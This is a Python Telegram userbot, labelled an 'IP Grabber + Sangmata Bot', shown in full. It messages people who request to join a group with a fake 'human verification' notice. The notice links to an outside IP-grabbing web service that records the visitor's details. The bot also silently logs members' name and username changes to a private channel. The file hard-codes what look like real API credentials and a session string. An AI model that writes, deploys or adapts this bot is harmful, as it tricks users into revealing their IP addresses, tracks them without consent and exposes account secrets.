import asyncio
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
import requests
from datetime import datetime

# === YOUR DATA ===
API_ID = 32696327
API_HASH = "7748fec8a76bc4ed65006d13accd7555"
SESSION_STRING = "BQHy6AcALg8-IFn7jkiIrFq2qi9xZrWhiMY78No7c6ZlSkOAUI2RF3OrW4nATGI_faDP87KwAzE6TBOEeGbPdKm8VJtzVY2y9vW9xYt2YUMtCiRrnV2DAF56tUOvAM6WVPRh9j0Pq7YNbHsnGU8lrV6tO-eH5mwrZzdC3tiVsxm9KaxRd7KRkSRSoyWLxv0WuMDU2-vA4AzNyZMDK0F3V62guodW6XuBa2WvVK0fzgLTK14PG_ZOAWmrsn5Nz77t1-OYYVd4Wbc0fFqZTDr5g_OsJZeYimCLXY2tl3VlcXO-k8IYJ93sbDD5ZquBZDMeOJ8sZYSvoypHfhfFDdTWt-3wEB6upwAAAAB01CSBAA"
WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
LOG_CHANNEL = -1002290475903

app = Client("sangmata_ip_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)

# Simple in-memory storage (for starter). Later we can upgrade to MongoDB
user_history = {}

@app.on_chat_join_request()
async def handle_join_request(client, request):
    user_id = request.user_chat_id
    chat_id = request.chat.id
    first_name = request.from_user.first_name or "User"

    link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Verify Account & Join Group", url=link)]
    ])

    try:
        await client.send_message(
            user_id,
            "✅ Human verification successful!\n\n"
            "Click the button below for **final verification** and to join the group:\n\n"
            "Link will expire in 10 minutes.",
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"Failed to send PM: {e}")

# Sangmata-like features: Track name and username changes
@app.on_message(filters.group)
async def track_user(client, message):
    if not message.from_user:
        return

    user = message.from_user
    user_id = user.id

    if user_id not in user_history:
        user_history[user_id] = {
            "first_name": user.first_name,
            "username": user.username,
            "created_at": datetime.now()
        }

    # Check if name or username changed
    old = user_history[user_id]
    changed = False
    log_msg = ""

    if user.first_name != old["first_name"]:
        log_msg += f"🔄 Name changed: {old['first_name']} → {user.first_name}\n"
        changed = True
    if user.username != old.get("username"):
        log_msg += f"🔄 Username changed: @{old.get('username')} → @{user.username}\n"
        changed = True

    if changed:
        log_text = f"""
🔥 USER UPDATE DETECTED

👤 User: {user.first_name}
🆔 ID: <code>{user_id}</code>
{log_msg}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
        """
        await client.send_message(LOG_CHANNEL, log_text)

    # Update storage
    user_history[user_id] = {
        "first_name": user.first_name,
        "username": user.username,
        "created_at": old["created_at"]
    }

print("✅ Advanced IP Grabber + Sangmata Bot is running...")
app.run()
